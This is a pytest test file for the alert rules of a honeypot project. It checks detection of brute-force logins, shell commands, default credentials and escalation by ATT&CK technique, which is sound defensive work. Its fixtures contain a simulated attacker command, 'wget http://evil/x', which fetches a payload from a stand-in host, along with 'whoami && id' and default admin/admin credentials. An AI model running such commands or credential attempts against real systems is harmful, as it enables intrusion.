"""Tests for :mod:`honeytrap.alerts.rules`."""

from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

from honeytrap.alerts import Alert, AlertRuleContext, AlertRuleEngine, AlertSeverity
from honeytrap.alerts.rules import (
    rule_brute_force,
    rule_default_creds,
    rule_first_seen_ip,
    rule_shell_command,
)


def _event(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "protocol": "ssh",
        "event_type": "auth_attempt",
        "remote_ip": "203.0.113.5",
        "remote_port": 55555,
        "local_port": 22,
        "session_id": "s-1",
        "country_code": "XX",
        "country_name": "Unknown",
        "asn": "",
        "username": "root",
        "password": "hunter2",
        "path": "",
        "method": "",
        "user_agent": "",
        "message": "",
        "data": {},
    }
    base.update(overrides)
    return base


def test_brute_force_rule_fires_after_threshold() -> None:
    """rule_brute_force should fire once failed auths exceed the threshold."""
    ctx = AlertRuleContext(brute_force_threshold=3, brute_force_window_seconds=60.0)
    import time

    now = time.time()
    events = [
        _event(timestamp=datetime.fromtimestamp(now + i, tz=timezone.utc).isoformat())
        for i in range(5)
    ]
    first_three = [rule_brute_force(e, ctx) for e in events[:2]]
    assert all(alerts == [] for alerts in first_three)
    alerts = rule_brute_force(events[2], ctx)
    assert len(alerts) == 1
    assert alerts[0].severity is AlertSeverity.MEDIUM
    assert "brute-force" in alerts[0].tags
    assert alerts[0].source_ip == "203.0.113.5"


def test_shell_command_rule_fires_on_command_event() -> None:
    """rule_shell_command should emit a HIGH alert for shell_command events."""
    ctx = AlertRuleContext()
    event = _event(
        event_type="shell_command",
        message="command: whoami && id",
        data={"command": "whoami && id"},
    )
    alerts = rule_shell_command(event, ctx)
    assert len(alerts) == 1
    assert alerts[0].severity is AlertSeverity.HIGH
    assert "whoami" in alerts[0].summary


def test_first_seen_ip_rule_fires_only_once_per_ip() -> None:
    """rule_first_seen_ip should fire the first time and be silent afterward."""
    ctx = AlertRuleContext()
    event = _event(remote_ip="192.0.2.77")
    first = rule_first_seen_ip(event, ctx)
    second = rule_first_seen_ip(event, ctx)
    assert len(first) == 1
    assert first[0].severity is AlertSeverity.LOW
    assert second == []


def test_multiple_attck_techniques_raise_critical() -> None:
    """Two distinct techniques in one session should escalate to CRITICAL."""
    engine = AlertRuleEngine(context=AlertRuleContext())
    event = _event(
        event_type="shell_command",
        message="command: wget http://evil/x",
        data={
            "command": "wget http://evil/x",
            "attack_techniques": [
                {"technique_id": "T1059", "sub_technique_id": None},
                {"technique_id": "T1105", "sub_technique_id": None},
            ],
        },
    )
    alerts = engine.evaluate(event)
    severities = [a.severity for a in alerts]
    assert AlertSeverity.CRITICAL in severities


def test_custom_rule_can_be_registered() -> None:
    """register_rule should append user rules to the evaluation chain."""
    engine = AlertRuleEngine(rules=())  # start empty
    calls: list[str] = []

    def my_rule(event: dict[str, Any], ctx: AlertRuleContext) -> list[Alert]:
        calls.append(event["protocol"])
        return [
            Alert(
                title="custom",
                summary="hi",
                severity=AlertSeverity.INFO,
                protocol=event["protocol"],
            )
        ]

    engine.register_rule(my_rule)
    alerts = engine.evaluate(_event(protocol="ftp"))
    assert calls == ["ftp"]
    assert len(alerts) == 1
    assert alerts[0].title == "custom"


def test_default_creds_rule_requires_success() -> None:
    """Default-creds rule should only fire for successful authentications."""
    ctx = AlertRuleContext()
    fail = _event(username="admin", password="admin", data={"success": False})
    success = _event(username="admin", password="admin", data={"success": True})
    assert rule_default_creds(fail, ctx) == []
    alerts = rule_default_creds(success, ctx)
    assert len(alerts) == 1
    assert alerts[0].severity is AlertSeverity.HIGH


async def test_rule_engine_respects_min_severity_via_manager() -> None:
    """Alerts below the manager's floor should be dropped before dispatch."""
    from honeytrap.alerts import AlertManager

    engine = AlertRuleEngine(context=AlertRuleContext())
    manager = AlertManager(channels=[], rules=engine, min_severity=AlertSeverity.HIGH)
    dispatched = await manager.handle_event(_event(remote_ip="198.51.100.9"))
    # The first-seen-IP rule emits LOW; the brute-force rule needs >=10
    # failures; so nothing should reach HIGH here.
    assert dispatched == []
